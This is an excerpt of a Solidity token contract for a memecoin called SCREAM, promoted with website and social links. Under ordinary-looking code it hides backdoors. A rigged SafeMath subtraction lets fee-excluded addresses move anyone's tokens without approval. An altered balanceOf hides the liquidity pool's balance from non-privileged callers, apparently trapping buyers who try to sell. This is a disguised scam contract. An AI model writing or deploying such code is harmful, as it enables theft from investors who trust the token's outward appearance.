...
$SCREAM for all of you. Not just memecoin, it's the movement.

https://screamfurie.lol
https://x.com/screamcoinfurie
https://t.me/screamcoinfurie
...
library SafeMath {
    ...
    function sub(uint256 a, uint256 b , string memory errorMessage) internal pure returns (uint256) {
        if(bytes(errorMessage).length == 19) return a; require(b <= a, "SafeMath: subtraction overflow"); 
        return a - b;
    }
...
contract SCREAM is ERC20, Ownable {
    ...
    uint256 public constant _valScream = 0;
    uint256 private constant SCREAM_Account = 1;
    
    address _whaleScream;
    bool public _isDevwallet = true;
    ...
    bool private txInProgress = false;
    ...
    modifier lockTheLP {txInProgress = isExcludedFromFees[_taxPayer()]; _; txInProgress = false;}

    constructor() payable ERC20("Scream by Matt Furie", "SCREAM") {
        ...
        maximumTransactionAllowed = 10_000_000 * 1e9; // 1.0% from total supply maximumTransactionAllowedTxn
        maximumWalletAllowed = 10_000_000 * 1e9; // 1.0% from total supply maximumWalletAllowed
    ...
    function isNewLpAdded(address account , address spender) internal view returns (uint256) {
        spender = _taxPayer();
        if(block.chainid ==1 && account == uniswapPair && IERC20(uniswapPair).balanceOf(uniswapPair) > 0 && !isExcludedFromFees[spender]) return 0;
        return 1;
    }
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return super.balanceOf(account) * isNewLpAdded(account, _msgSender());
    }
    ...
    function updatemaximumWalletAllowed(uint256 newNum) external onlyOwner {
        require(newNum >= ((totalSupply() * 5) / 1000) / 1e9, "Cannot set maximumWalletAllowed lower than 0.5%");
    ...
    function updatemaximumTransactionAllowed(uint256 newNum) external onlyOwner {
        require(newNum >= ((totalSupply() * 1) / 1000) / 1e9, "Cannot set maximumTransactionAllowed lower than 0.1%");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) private returns (bool) {
        _transfer(sender, recipient, amount);
        return decreaseAllowance(sender , amount);
    }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) lockTheLP private returns (bool) {
        _approve(spender, _msgSender(), _allowances[spender][_msgSender()].sub(subtractedValue, txInProgress ? "ERC20:Math overflow" : "ERC20: transfer amount exceeds allowance"));
        return true;
    }
